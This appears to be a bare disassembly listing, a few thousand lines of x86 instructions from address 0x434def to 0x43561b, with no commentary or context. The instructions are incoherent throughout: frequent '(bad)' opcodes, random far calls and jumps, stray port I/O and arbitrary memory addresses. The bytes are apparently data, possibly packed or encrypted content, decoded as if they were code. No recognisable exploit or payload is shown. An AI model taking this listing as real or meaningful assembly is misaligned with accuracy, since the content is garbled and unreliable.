  434def:	mov    ah,0xc9
  434df1:	mov    dh,0x9e
  434df3:	cmp    dl,BYTE PTR [ebx+0x12eea046]
  434df9:	in     al,dx
  434dfa:	sbb    al,0xa9
  434dfc:	pop    eax
  434dfd:	sub    cl,0xc9
  434e00:	mov    ds:0xa898b270,al
  434e05:	fdiv   DWORD PTR [eax+0x61]
  434e08:	bound  edi,QWORD PTR [edi]
  434e0a:	(bad)  
  434e0b:	out    dx,eax
  434e0c:	fisub  DWORD PTR [eax-0x175f574b]
  434e12:	sub    DWORD PTR [esi+0x7e98aa3a],0x30
  434e19:	push   ss
  434e1a:	mov    ch,0xc0
  434e1c:	inc    ecx
  434e1d:	push   es
  434e1e:	popw   es
  434e20:	shl    BYTE PTR [ecx+0x40],cl
  434e23:	test   eax,0x57533e3d
  434e28:	cmp    al,dl
  434e2a:	loopne 0x434dc3
  434e2c:	add    eax,ebx
  434e2e:	mov    eax,ds:0x31362232
  434e33:	repz mov dl,0x8a
  434e36:	lods   eax,DWORD PTR ds:[esi]
  434e37:	cmp    eax,0x5db29a3a
  434e3c:	adc    BYTE PTR [esp],dl
  434e3f:	pop    eax
  434e40:	lahf   
  434e41:	call   0xb8e4a01e
  434e46:	pop    edx
  434e47:	or     eax,DWORD PTR [edx-0x3ef9fa2a]
  434e4d:	mov    esi,esp
  434e4f:	inc    eax
  434e50:	ins    BYTE PTR es:[edi],dx
  434e51:	outs   dx,BYTE PTR ds:[esi]
  434e52:	push   cs
  434e53:	adc    al,0x0
  434e55:	scas   al,BYTE PTR es:[edi]
  434e56:	mov    ds:0x689b4464,eax
  434e5b:	mov    ah,0x64
  434e5d:	and    al,0xd8
  434e5f:	out    dx,al
  434e60:	cs xchg edx,eax
  434e62:	std    
  434e63:	cmp    al,BYTE PTR [edx-0x6e]
  434e66:	(bad)  
  434e67:	xchg   ebx,eax
  434e68:	adc    eax,0xaba205ca
  434e6d:	sbb    DWORD PTR [esi-0x4],0x8282cbc8
  434e74:	pop    ebx
  434e75:	sti    
  434e76:	cmp    al,0xd1
  434e78:	or     BYTE PTR [edx],bh
  434e7a:	pop    eax
  434e7b:	jbe    0x434ed9
  434e7d:	add    cl,dh
  434e7f:	sbb    BYTE PTR [ebx-0x46],bl
  434e82:	pop    ecx
  434e83:	adc    eax,0xd65cc120
  434e88:	jb     0x434e0a
  434e8a:	(bad)  
  434e8b:	push   0x1e
  434e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434e8e:	or     ch,BYTE PTR [ebx-0x660db7f0]
  434e94:	in     al,dx
  434e95:	push   esi
  434e96:	push   ebp
  434e97:	jl     0x434e2c
  434e99:	fidiv  DWORD PTR [edx-0x4711bbcb]
  434e9f:	push   0x5a
  434ea1:	cmp    al,0x36
  434ea3:	mov    edx,0xecec9025
  434ea8:	sbb    ecx,0x240eda93
  434eae:	call   0x38ab:0xe22976cb
  434eb5:	adc    dh,ah
  434eb7:	and    al,0x72
  434eb9:	dec    edx
  434eba:	fsubr  DWORD PTR [edx-0x78]
  434ebd:	xor    ecx,DWORD PTR [edx]
  434ebf:	pop    eax
  434ec0:	inc    esp
  434ec1:	push   ebp
  434ec2:	inc    ebx
  434ec3:	dec    edi
  434ec4:	cmp    BYTE PTR [edx],bl
  434ec6:	adc    dh,dh
  434ec8:	ret    0xa26a
  434ecb:	call   0xdb95:0xfcc35ede
  434ed2:	adc    esi,DWORD PTR [ecx-0x6f4b1920]
  434ed8:	adc    al,0x31
  434eda:	dec    esp
  434edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434edc:	push   ss
  434edd:	imul   esp,DWORD PTR [eax+0x5c2b485d],0x50e88250
  434ee7:	jo     0x434ea5
  434ee9:	shl    BYTE PTR [ebp+0x23eead8d],cl
  434eef:	xchg   esp,eax
  434ef0:	iret   
  434ef1:	stos   DWORD PTR es:[edi],eax
  434ef2:	inc    esi
  434ef3:	cmp    ah,BYTE PTR [ecx-0x40]
  434ef6:	pop    eax
  434ef7:	sbb    eax,0x361e518a
  434efc:	call   0x4476bc11
  434f01:	ins    DWORD PTR es:[edi],dx
  434f02:	jo     0x434ef8
  434f04:	fst    DWORD PTR [esi-0x3f]
  434f07:	dec    ebx
  434f08:	sub    al,0xc3
  434f0a:	add    DWORD PTR [esi-0x14],ebp
  434f0d:	mov    edi,0xf86af414
  434f12:	and    eax,DWORD PTR [eax]
  434f14:	or     DWORD PTR [esi+0x12],esi
  434f17:	add    bl,BYTE PTR [ecx]
  434f19:	add    BYTE PTR [esi+eiz*4],al
  434f1c:	loop   0x434f21
  434f1e:	mov    DWORD PTR [edx-0x770dbcc6],esp
  434f24:	jmp    0x9ed549a
  434f29:	enter  0xba05,0x1e
  434f2d:	add    eax,0x36a771d1
  434f32:	jg     0x434f34
  434f34:	mov    dl,0x9c
  434f36:	jecxz  0x434f42
  434f38:	shr    DWORD PTR [eax-0x63b8ad48],0x58
  434f3f:	cli    
  434f40:	cmc    
  434f41:	ret    
  434f42:	clc    
  434f43:	and    DWORD PTR [eax+0x3f389952],esp
  434f49:	call   0x1f105d01
  434f4e:	adc    dh,BYTE PTR [ecx+eiz*1+0x328facd0]
  434f55:	aad    0x3a
  434f57:	jo     0x434f5d
  434f59:	sti    
  434f5a:	sub    BYTE PTR [ecx+0x341c9062],ch
  434f60:	das    
  434f61:	mov    dl,BYTE PTR ds:0x88258859
  434f67:	mov    DWORD PTR [edx],ebp
  434f69:	mov    ah,0x2b
  434f6b:	push   esp
  434f6c:	xor    eax,0x8caa00bc
  434f71:	fisubr DWORD PTR [ebx+eiz*8-0x54]
  434f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434f76:	push   0x30ada948
  434f7b:	mov    ?,WORD PTR [ebx+eiz*1]
  434f7e:	stc    
  434f7f:	inc    eax
  434f80:	push   0xf851e0a2
  434f85:	inc    esp
  434f86:	test   BYTE PTR [eax-0x20e11c72],bh
  434f8c:	loop   0x434f33
  434f8e:	mov    BYTE PTR [esi],al
  434f90:	stos   BYTE PTR es:[edi],al
  434f91:	cmp    eax,0x45c844bc
  434f96:	mov    DWORD PTR [esi-0x619af39d],0xfea2a7a3
  434fa0:	fs sbb eax,0x6715811
  434fa6:	add    BYTE PTR [eax-0x42],ch
  434fa9:	xchg   ebx,eax
  434faa:	pop    ebx
  434fab:	cmp    al,0xe1
  434fad:	cmp    eax,0xb021aa20
  434fb2:	(bad)  
  434fb4:	pop    ss
  434fb5:	adc    dl,BYTE PTR ds:0xc4a0a655
  434fbb:	or     DWORD PTR [esi+0x3d],esp
  434fbe:	(bad)  
  434fbf:	mov    al,0x5e
  434fc1:	cmp    al,0xa0
  434fc3:	cs push eax
  434fc5:	or     eax,0xe202a680
  434fca:	lods   al,BYTE PTR ds:[esi]
  434fcb:	add    eax,0x3c267423
  434fd1:	mov    ah,BYTE PTR [edx]
  434fd3:	dec    ebx
  434fd4:	push   ecx
  434fd5:	popf   
  434fd6:	test   BYTE PTR [esp+edi*2-0x42],cl
  434fda:	and    dh,al
  434fdc:	retf   
  434fdd:	les    esi,FWORD PTR [edx]
  434fdf:	push   edx
  434fe0:	ror    BYTE PTR [ebp+0x24fac020],0xfd
  434fe7:	pop    edx
  434fe8:	or     esp,DWORD PTR [edx+ebp*2+0x47]
  434fec:	cld    
  434fed:	mov    ch,0x39
  434fef:	push   ss
  434ff0:	jl     0x43500c
  434ff2:	in     al,0xde
  434ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434ff5:	bound  edx,QWORD PTR [esi-0x45c707f0]
  434ffb:	add    al,0xc4
  434ffd:	mov    eax,ds:0x4ac69eb6
  435002:	mov    al,ds:0xa6a01554
  435007:	ss in  al,dx
  435009:	cmp    BYTE PTR [ebp+0x6003f530],0x81
  435010:	pop    es
  435011:	or     al,dh
  435013:	jno    0x434fe0
  435015:	push   0x2f
  435017:	inc    eax
  435018:	add    al,0x67
  43501a:	mov    ds,WORD PTR [ecx+eiz*2]
  43501d:	scas   al,BYTE PTR es:[edi]
  43501e:	mov    ds:0x8c96c6dd,al
  435023:	mov    cl,0xbd
  435025:	sbb    ah,dh
  435027:	dec    edx
  435028:	and    BYTE PTR [edx-0x2d],bl
  43502b:	out    0x42,al
  43502d:	add    BYTE PTR [esi-0x6e7d8569],cl
  435033:	inc    eax
  435034:	cmp    eax,0x1f6d9a3a
  435039:	hlt    
  43503a:	das    
  43503b:	push   ss
  43503c:	rcl    DWORD PTR [edi-0x344bfae],cl
  435042:	dec    edx
  435043:	cmp    eax,0xb2a24508
  435048:	push   ss
  435049:	and    al,0x57
  43504b:	arpl   bx,di
  43504d:	xor    BYTE PTR [edx+eiz*8+0x6a40a319],0x64
  435055:	and    eax,0xfb44c3cc
  43505a:	(bad)  
  43505d:	xor    al,BYTE PTR [eax]
  43505f:	jg     0x435088
  435061:	(bad)  
  435063:	add    BYTE PTR [eax+esi*1-0x37306b0b],bh
  43506a:	mov    dl,0xe3
  43506c:	add    bl,bl
  43506e:	and    BYTE PTR [esi+0x4c1e261e],al
  435074:	bound  edx,QWORD PTR [ecx-0x387a1d84]
  43507a:	rol    BYTE PTR [esi],cl
  43507c:	sub    BYTE PTR [edi+0x76],0x48
  435080:	xchg   esp,eax
  435081:	fbstp  TBYTE PTR [esi]
  435083:	ds loop 0x435029
  435086:	loopne 0x435041
  435088:	or     esp,ebx
  43508a:	xchg   edx,eax
  43508b:	lods   eax,DWORD PTR ds:[esi]
  43508c:	fadd   DWORD PTR [ecx+0x6a92978d]
  435092:	cs test al,0xc3
  435095:	push   0xffffff9a
  435097:	fcmovbe st,st(4)
  435099:	push   ss
  43509a:	inc    esp
  43509b:	add    BYTE PTR [edx],ah
  43509d:	sbb    al,0xf5
  43509f:	mov    esi,0xd1b33be4
  4350a4:	dec    ecx
  4350a5:	jl     0x4350c3
  4350a7:	mov    ds:0xa4d01c4c,eax
  4350ac:	es push es
  4350ae:	fisub  DWORD PTR [eax+0x5eb6d27c]
  4350b4:	out    0x92,al
  4350b6:	xchg   BYTE PTR [esi+0x4e1b01a],ah
  4350bc:	cmovne ebp,DWORD PTR [ebp+0x5d]
  4350c0:	push   cs
  4350c1:	sub    BYTE PTR [esi],ch
  4350c3:	push   edx
  4350c4:	mov    eax,eax
  4350c6:	or     al,BYTE PTR [ebp+0x1b47b616]
  4350cc:	js     0x435128
  4350ce:	out    dx,al
  4350cf:	dec    ebp
  4350d0:	sub    eax,ecx
  4350d2:	xchg   ebx,eax
  4350d3:	lea    eax,[edi+0xa]
  4350d6:	cs mov gs,esi
  4350d9:	sbb    al,0xfc
  4350db:	push   esp
  4350dc:	ror    DWORD PTR [ecx-0x3a3283bc],1
  4350e2:	fs add al,0xd4
  4350e5:	out    0x86,al
  4350e7:	ror    BYTE PTR [edi+edi*1-0x5c],1
  4350eb:	pop    eax
  4350ec:	pusha  
  4350ed:	pop    ebx
  4350ee:	shl    DWORD PTR [edi-0x5419a87f],1
  4350f4:	inc    ebp
  4350f5:	loop   0x4350a5
  4350f7:	dec    edx
  4350f8:	lahf   
  4350f9:	dec    eax
  4350fa:	ins    DWORD PTR es:[edi],dx
  4350fb:	jp     0x435093
  4350fd:	push   cs
  4350fe:	add    ah,bl
  435100:	adc    BYTE PTR [ebx],dl
  435102:	retf   0x662c
  435105:	push   ebx
  435106:	xchg   BYTE PTR [esi-0x43c9a7f5],al
  43510c:	or     BYTE PTR [ecx-0x74],bl
  43510f:	push   es
  435110:	adc    DWORD PTR [eax-0x4df9f756],esp
  435116:	sub    BYTE PTR [eax-0x5d],0xf4
  43511a:	retf   0x3ac4
  43511d:	mov    edi,0x12d05d16
  435122:	sbb    eax,DWORD PTR [eax-0x49]
  435125:	sub    BYTE PTR [esp+edx*4],0xbb
  435129:	call   0xd3e2:0x4a06869a
  435130:	mov    dh,0x3b
  435132:	ret    
  435133:	rol    al,1
  435135:	daa    
  435136:	sbb    dl,BYTE PTR [edx+0x4e53c65f]
  43513c:	inc    edx
  43513d:	in     eax,dx
  43513e:	pop    eax
  43513f:	test   eax,0xb4c453d0
  435144:	arpl   WORD PTR [eax+0x33],bp
  435147:	add    al,0x8e
  435149:	or     eax,0x76b976f6
  43514e:	pop    esp
  43514f:	and    dh,BYTE PTR [esi]
  435151:	mov    ecx,0x818e6849
  435156:	cwde   
  435157:	jmp    0x988af70f
  43515c:	sbb    DWORD PTR [eax+0x1d1049c6],ecx
  435162:	push   ebx
  435163:	jp     0x4351a9
  435165:	inc    esi
  435166:	das    
  435167:	ins    BYTE PTR es:[edi],dx
  435168:	bnd call esi
  43516b:	sbb    al,BYTE PTR [ebp+0x14]
  43516e:	dec    edx
  43516f:	add    ch,dl
  435171:	sbb    cl,BYTE PTR [eax-0x5379112f]
  435177:	pop    eax
  435178:	sbb    eax,0xfbcc8dc0
  43517d:	jo     0x435155
  43517f:	popa   
  435180:	mov    al,ds:0x3c18d621
  435185:	fisubr WORD PTR [edx+0x11]
  435188:	and    DWORD PTR [ebx],esp
  43518a:	lea    ecx,[eax+ecx*4-0x3edae8ce]
  435191:	sub    al,BYTE PTR [edx-0x58]
  435194:	div    DWORD PTR [edx+ecx*8+0x2a2c647]
  43519b:	cld    
  43519c:	nop
  43519d:	push   esi
  43519e:	stc    
  43519f:	pop    eax
  4351a0:	jbe    0x4351b0
  4351a2:	push   eax
  4351a3:	dec    edx
  4351a4:	add    BYTE PTR ds:0xf580e018,al
  4351aa:	lea    edx,[ebp+0x22]
  4351ad:	stos   BYTE PTR es:[edi],al
  4351ae:	test   al,0x7
  4351b0:	(bad)  
  4351b1:	call   0x56da:0xdaedf667
  4351b8:	rcr    DWORD PTR [eax],1
  4351ba:	je     0x435217
  4351bc:	inc    esi
  4351bd:	mov    bh,0xbc
  4351bf:	add    BYTE PTR [edi],ah
  4351c1:	mov    bl,0x28
  4351c3:	or     cl,BYTE PTR [edi]
  4351c5:	sub    eax,0x255e946c
  4351ca:	and    al,0x22
  4351cc:	mov    al,ds:0x5c169ab0
  4351d1:	test   al,0x9a
  4351d3:	(bad)  
  4351d4:	xor    eax,edi
  4351d6:	push   edx
  4351d7:	das    
  4351d8:	mov    ds:0x3438682d,al
  4351dd:	popa   
  4351de:	clc    
  4351df:	loope  0x43525f
  4351e1:	xor    al,0x99
  4351e3:	cs jno 0x435172
  4351e6:	add    ch,BYTE PTR [esi+0x2ccbf020]
  4351ec:	or     eax,0x4e82268b
  4351f1:	inc    esi
  4351f2:	adc    cl,BYTE PTR [edx]
  4351f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4351f5:	sub    DWORD PTR [eax-0x3df2ea5e],eax
  4351fb:	mov    ch,0x40
  4351fd:	fistp  DWORD PTR [edx+0x32]
  435200:	fs sbb edx,0x5dbe05c4
  435207:	cwde   
  435208:	ficomp WORD PTR [eax+0x7a]
  43520b:	dec    ecx
  43520c:	bound  eax,QWORD PTR [ebx]
  43520e:	pop    esp
  43520f:	sbb    al,0x67
  435211:	in     al,dx
  435212:	add    DWORD PTR [ecx-0x5e811d53],0x4988c1e8
  43521c:	sti    
  43521d:	mov    edx,0xdab15a88
  435222:	ret    
  435223:	(bad)  
  435224:	jae    0x435268
  435226:	int    0x70
  435228:	xchg   edx,eax
  435229:	outs   dx,BYTE PTR ds:[esi]
  43522a:	ror    DWORD PTR [ecx],0x43
  43522d:	or     eax,0xe849dcf6
  435232:	pop    ss
  435233:	mov    al,0x62
  435235:	lock mov ds:0x4b194328,eax
  43523b:	(bad)  
  43523c:	(bad)  
  43523d:	icebp  
  43523e:	push   edx
  43523f:	adc    edx,0x7e55b8a2
  435245:	sub    edi,ebp
  435247:	and    dh,ah
  435249:	out    0x14,al
  43524b:	pop    edx
  43524c:	cwde   
  43524d:	enter  0x96d8,0x29
  435251:	mov    al,ds:0x42e682b5
  435256:	call   0x226b:0x88e81394
  43525d:	stos   DWORD PTR es:[edi],eax
  43525e:	ret    
  43525f:	data16 adc bh,BYTE PTR ds:0x40018836
  435266:	cdq    
  435267:	lods   eax,DWORD PTR ds:[esi]
  435268:	add    ebp,DWORD PTR [eax-0x23]
  43526b:	cli    
  43526c:	mov    al,ds:0xb1068a39
  435271:	mov    al,ds:0x2e8764a9
  435276:	push   cs
  435277:	add    ch,ch
  435279:	sub    eax,0xbd961d6b
  43527e:	xchg   edx,eax
  43527f:	lods   al,BYTE PTR ds:[esi]
  435280:	(bad)  
  435281:	sbb    al,0xa6
  435283:	sub    eax,esp
  435285:	fwait
  435286:	out    dx,al
  435287:	mov    ah,0xeb
  435289:	ret    0xe244
  43528c:	jp     0x4352e9
  43528e:	ds aas 
  435290:	xchg   ebp,eax
  435291:	pop    eax
  435292:	fucomi st,st(4)
  435294:	aaa    
  435295:	hlt    
  435296:	add    bl,cl
  435298:	retf   0x3b58
  43529b:	sti    
  43529c:	rol    BYTE PTR [eax-0x1e],1
  43529f:	inc    ecx
  4352a0:	mov    al,ds:0x2d2a7555
  4352a5:	fmul   DWORD PTR [edx]
  4352a7:	push   edx
  4352a8:	dec    edi
  4352a9:	sub    al,0x3c
  4352ab:	adc    BYTE PTR [eax+esi*4-0x9],0x8a
  4352b0:	mov    dh,0x54
  4352b2:	xor    al,0xab
  4352b4:	fcomp  DWORD PTR [esi+0x5e704300]
  4352ba:	sbb    eax,0x4c5ebe9a
  4352bf:	in     eax,0x52
  4352c1:	fist   WORD PTR [esi+esi*1+0x32b00be0]
  4352c8:	mov    dl,0xc5
  4352ca:	add    esp,DWORD PTR [ecx-0x116f81eb]
  4352d0:	pop    es
  4352d1:	pop    eax
  4352d2:	hlt    
  4352d3:	or     BYTE PTR [eax+ebp*1+0x17],ah
  4352d7:	mov    BYTE PTR [edx],cl
  4352d9:	mov    eax,0x6b6b849a
  4352de:	mov    dh,0xa9
  4352e0:	and    BYTE PTR [eax-0x24],al
  4352e3:	cmp    eax,edx
  4352e5:	call   0x20fadb79
  4352ea:	rcl    BYTE PTR [esi+0x74],1
  4352ed:	and    DWORD PTR [esi],ecx
  4352ef:	and    eax,0xc5ac06bc
  4352f4:	loope  0x435300
  4352f6:	push   es
  4352f7:	jmp    0x50d8:0x7024c45b
  4352fe:	dec    edx
  4352ff:	adc    bh,al
  435301:	push   eax
  435302:	dec    edx
  435303:	pop    edx
  435304:	gs fwait
  435306:	stos   BYTE PTR es:[edi],al
  435307:	push   0xa
  435309:	in     al,0x58
  43530b:	(bad)  
  43530c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43530d:	push   edx
  43530e:	and    al,0xa9
  435310:	popa   
  435311:	cmp    al,0xd2
  435313:	mov    al,ds:0x5516a2ca
  435318:	sub    BYTE PTR [edx+0x64],ch
  43531b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43531c:	xchg   BYTE PTR [esi+0xd412746],bl
  435322:	cmp    al,BYTE PTR [esi-0x4]
  435325:	sub    al,0x5a
  435327:	xchg   BYTE PTR [edi+0xd],ch
  43532a:	push   edi
  43532b:	ror    BYTE PTR [esi+ecx*1],cl
  43532e:	mov    WORD PTR ss:[edx-0x56e3bfeb],ss
  435335:	add    BYTE PTR [ebp-0x56d83cb9],bh
  43533b:	jmp    0x2cee450e
  435340:	jmp    0x6d30:0x6c9aa4ce
  435347:	cmp    cl,BYTE PTR [eax+0x16026d5f]
  43534d:	test   al,0x8d
  43534f:	scas   eax,DWORD PTR es:[edi]
  435350:	int3   
  435351:	and    al,0x45
  435353:	dec    esp
  435354:	adc    eax,0xfe570585
  435359:	shl    BYTE PTR [eax-0x18],0x96
  43535d:	sbb    BYTE PTR [ebp+0x2c],dh
  435360:	imul   edx,edi,0x15688038
  435366:	cmp    al,0x91
  435368:	adc    eax,0x22a32aa5
  43536d:	in     al,0x94
  43536f:	ds and edi,eax
  435372:	or     ecx,DWORD PTR ds:0xea00cbba
  435378:	pop    edi
  435379:	jmp    0xb4c0:0x85460bea
  435380:	and    BYTE PTR [eax+0x466d610e],dl
  435386:	in     al,dx
  435387:	call   0x32d9be06
  43538c:	fmul   DWORD PTR [esp+0x1a]
  435390:	xchg   BYTE PTR [eax+0x4889bea2],bl
  435396:	inc    esp
  435397:	xor    eax,0x9918cb5d
  43539c:	sbb    al,0xf5
  43539e:	add    DWORD PTR [eax+ebp*1+0x1a],esi
  4353a2:	mov    cs,ecx
  4353a4:	fsubr  QWORD PTR [eax-0x5da57950]
  4353aa:	int    0xe
  4353ac:	cli    
  4353ad:	fs popf 
  4353af:	push   0xa04df676
  4353b4:	mov    DWORD PTR [eax+0x6ae2ee32],esi
  4353ba:	pop    es
  4353bb:	adc    BYTE PTR [edx],ch
  4353bd:	test   eax,0x62968e68
  4353c2:	test   eax,0xac81fc40
  4353c7:	xchg   ebp,eax
  4353c8:	lods   al,BYTE PTR ds:[esi]
  4353c9:	pusha  
  4353ca:	pop    ss
  4353cb:	add    BYTE PTR [eax+0x6b],dl
  4353ce:	sbb    ebp,ebp
  4353d0:	cmp    BYTE PTR [eax-0x2e],0xd0
  4353d4:	cli    
  4353d5:	pop    esi
  4353d6:	sub    BYTE PTR [edx],cl
  4353d8:	jae    0x4353b0
  4353da:	mov    es,WORD PTR [esp+esi*1-0x66]
  4353de:	push   ebp
  4353df:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4353e1:	sub    BYTE PTR [edx+0x58],dl
  4353e4:	mov    ds:0x29b435a2,eax
  4353e9:	inc    esi
  4353ea:	dec    esi
  4353eb:	sbb    edi,DWORD PTR es:[ecx+eiz*1+0xa]
  4353f0:	mov    eax,0x34346dbe
  4353f5:	and    al,0x13
  4353f7:	and    BYTE PTR [ebx+0x55110336],ch
  4353fd:	add    BYTE PTR [edx],bl
  4353ff:	stos   BYTE PTR es:[edi],al
  435400:	inc    esp
  435401:	add    BYTE PTR [ecx+0x14],cl
  435404:	push   ss
  435405:	push   esp
  435406:	jl     0x4353fa
  435408:	xor    DWORD PTR [esi+esi*4+0x7af743ea],ebp
  43540f:	popa   
  435410:	inc    ecx
  435411:	cmp    eax,DWORD PTR [edx]
  435413:	push   esi
  435414:	sub    BYTE PTR [edi+0x5a],ch
  435417:	iret   
  435418:	ss ins BYTE PTR es:[edi],dx
  43541a:	test   eax,0x48801435
  43541f:	add    ah,dh
  435421:	xlat   BYTE PTR ds:[ebx]
  435422:	jo     0x435481
  435424:	mov    ah,0xb4
  435426:	dec    eax
  435427:	inc    esp
  435428:	jbe    0x435416
  43542a:	cdq    
  43542b:	and    ebx,DWORD PTR ds:0x143ae81d
  435431:	repz pop esp
  435433:	imul   BYTE PTR [ebp+eax*1+0x109d4a30]
  43543a:	(bad)  
  43543c:	add    BYTE PTR [ebx-0x30],bh
  43543f:	idiv   BYTE PTR [edx+0x404ba8a1]
  435445:	xchg   esp,eax
  435446:	jb     0x4353e4
  435448:	ret    0xb4ba
  43544b:	pop    edx
  43544c:	lods   al,BYTE PTR ds:[esi]
  43544d:	dec    esp
  43544e:	(bad)  
  43544f:	rcr    BYTE PTR [esi+0x5428af0a],cl
  435455:	push   edx
  435456:	xchg   esp,eax
  435457:	mov    ds:0xdea43392,al
  43545c:	test   BYTE PTR [esi-0x4],bl
  43545f:	mov    bl,0xb8
  435461:	mov    ds:0xd5a123e8,al
  435466:	stos   BYTE PTR es:[edi],al
  435467:	outs   dx,BYTE PTR ds:[esi]
  435468:	pushf  
  435469:	ins    BYTE PTR es:[edi],dx
  43546a:	in     al,dx
  43546b:	lods   eax,DWORD PTR ds:[esi]
  43546c:	cmc    
  43546d:	sar    eax,0x61
  435470:	adc    al,0xa1
  435472:	outs   dx,BYTE PTR ds:[esi]
  435473:	shl    BYTE PTR [ebp-0x26],1
  435476:	scas   eax,DWORD PTR es:[edi]
  435477:	imul   edi,DWORD PTR [eax+edx*4+0x78],0xad9ecf04
  43547f:	jge    0x435488
  435481:	mov    al,ds:0x335e434b
  435486:	fisubr DWORD PTR [edx+0x78059329]
  43548c:	sar    ch,0xa3
  43548f:	push   eax
  435490:	pop    ds
  435491:	xchg   BYTE PTR [esi],ah
  435493:	xor    DWORD PTR [esi+0x3c],0x1c545617
  43549a:	rcr    BYTE PTR [edi],1
  43549c:	call   0x4c2de302
  4354a1:	sub    ah,BYTE PTR [esi+0x40]
  4354a4:	xor    esp,DWORD PTR [ebp-0x593f2ae]
  4354aa:	aaa    
  4354ab:	sub    al,0x93
  4354ad:	and    BYTE PTR [ebx],0x24
  4354b0:	clc    
  4354b1:	aas    
  4354b2:	and    DWORD PTR [esi+eax*2-0x12],edi
  4354b6:	add    BYTE PTR [eax*4-0x7116c46],dh
  4354bd:	mov    dl,0xf4
  4354bf:	inc    edx
  4354c0:	mov    al,ds:0x7090d1c4
  4354c5:	les    eax,FWORD PTR [edx+0x13]
  4354c8:	in     al,dx
  4354c9:	push   ds
  4354ca:	or     eax,DWORD PTR [ecx]
  4354cc:	xchg   esi,eax
  4354cd:	call   0xd8d1:0x5eb2be47
  4354d4:	xchg   esp,eax
  4354d5:	sub    BYTE PTR [edi-0x72],dl
  4354d8:	lods   al,BYTE PTR ds:[esi]
  4354d9:	gs nop
  4354db:	adc    eax,0x5fdefa40
  4354e0:	mov    dl,0x1a
  4354e2:	sar    BYTE PTR [edx+ecx*4],1
  4354e5:	fiadd  DWORD PTR [edx]
  4354e7:	dec    ecx
  4354e8:	mov    ebp,0x8eec44c5
  4354ed:	lahf   
  4354ee:	adc    al,0x16
  4354f0:	test   al,0x1e
  4354f2:	ror    edx,0x96
  4354f5:	jmp    0x7886:0x8605813c
  4354fc:	out    0xa,al
  4354fe:	xor    dh,al
  435500:	fmulp  st(2),st
  435502:	test   al,0x68
  435504:	pop    es
  435505:	jp     0x4354c3
  435507:	test   eax,0xe21a5a1f
  43550c:	rcl    DWORD PTR [eax],0x99
  43550f:	adc    BYTE PTR [edx+0x628ccaac],ch
  435515:	sbb    BYTE PTR cs:0xaa43e9b0,dh
  43551c:	je     0x43556a
  43551e:	pop    edx
  43551f:	int    0xb2
  435521:	pop    edx
  435522:	xor    BYTE PTR [eax],ah
  435524:	lods   eax,DWORD PTR ds:[esi]
  435525:	clc    
  435526:	push   es
  435527:	xor    BYTE PTR [eax+0x1b37f75e],dl
  43552d:	push   ds
  43552e:	retf   0x3c7a
  435531:	sbb    edi,ebx
  435533:	bnd jae 0x43552a
  435536:	loopne 0x435570
  435538:	add    BYTE PTR [esp+eiz*2-0x7db533f5],dl
  43553f:	pusha  
  435540:	arpl   WORD PTR [esi+0x61b02b10],bx
  435546:	jmp    0x4c7b:0x788e9370
  43554d:	sbb    ah,dl
  43554f:	scas   al,BYTE PTR es:[edi]
  435550:	es inc esi
  435552:	add    ebp,DWORD PTR [edx-0x7cbafe6c]
  435558:	xor    eax,0x52cea2c5
  43555d:	fadd   DWORD PTR [eax+0x2c]
  435560:	push   ecx
  435561:	mov    eax,0x632fb416
  435566:	pop    ecx
  435567:	pop    esi
  435568:	jo     0x4355e7
  43556a:	xor    al,0xae
  43556c:	mul    cl
  43556e:	sti    
  43556f:	push   es
  435570:	dec    eax
  435571:	sub    ecx,eax
  435573:	retf   0xc06c
  435576:	outs   dx,DWORD PTR ds:[esi]
  435577:	call   0xf71bfa11
  43557c:	mov    BYTE PTR [ebx-0x4894ffae],ch
  435582:	sbb    BYTE PTR [esi],dl
  435584:	retf   
  435585:	shl    BYTE PTR [edi+0x54],cl
  435588:	inc    esp
  435589:	fld    DWORD PTR [edx]
  43558b:	xor    DWORD PTR [ebp+0x5c],0xb6ea760e
  435592:	dec    ebx
  435593:	and    ch,BYTE PTR [esp+ebp*2]
  435596:	and    ah,BYTE PTR [edx-0x7de5c3c0]
  43559c:	mov    eax,0x4611f0e8
  4355a1:	sti    
  4355a2:	int3   
  4355a3:	stos   BYTE PTR es:[edi],al
  4355a4:	fmul   QWORD PTR [esi-0x4c5d8d35]
  4355aa:	pop    ds
  4355ab:	add    al,0x3d
  4355ad:	xchg   esp,eax
  4355ae:	or     BYTE PTR [ebp-0x639bc311],dl
  4355b4:	shl    DWORD PTR [ecx],1
  4355b6:	cmp    eax,0x4e632641
  4355bb:	(bad)  
  4355bc:	push   0x36d1b2b8
  4355c1:	jmp    0x435595
  4355c3:	(bad)  
  4355c4:	in     al,dx
  4355c5:	aas    
  4355c6:	xchg   DWORD PTR [eax],ecx
  4355c8:	xchg   esp,eax
  4355c9:	ins    DWORD PTR es:[edi],dx
  4355ca:	push   cs
  4355cb:	daa    
  4355cc:	xlat   BYTE PTR ds:[ebx]
  4355cd:	loop   0x435613
  4355cf:	push   esp
  4355d0:	retf   
  4355d1:	clc    
  4355d2:	imul   ebp,DWORD PTR [eax-0x15],0x9a3b48ff
  4355d9:	mov    ah,0x9e
  4355db:	add    bh,BYTE PTR [esi]
  4355dd:	retf   0x61b1
  4355e0:	cld    
  4355e1:	or     eax,0x8e6d4d3f
  4355e6:	xor    dl,0xa6
  4355e9:	lods   eax,DWORD PTR ds:[esi]
  4355ea:	jne    0x4355de
  4355ec:	xor    ebp,DWORD PTR [esi+0xe5367a6]
  4355f2:	xchg   esp,eax
  4355f3:	inc    esi
  4355f4:	fisubr DWORD PTR [esi+0x53]
  4355f7:	push   esp
  4355f8:	jl     0x4355ba
  4355fa:	mov    bh,0x79
  4355fc:	xchg   esi,eax
  4355fd:	imul   esp,DWORD PTR [esi-0x18],0x13a63481
  435604:	sbb    eax,0xcb04146
  435609:	pop    esi
  43560a:	stos   BYTE PTR es:[edi],al
  43560b:	jle    0x43561d
  43560d:	inc    esp
  43560e:	rol    DWORD PTR [ebx],cl
  435610:	xchg   esp,eax
  435611:	cdq    
  435612:	mov    eax,gs
  435614:	or     ah,BYTE PTR [ecx+edx*2+0x6c0ee84d]
  43561b:	mov    esi,0x40381692
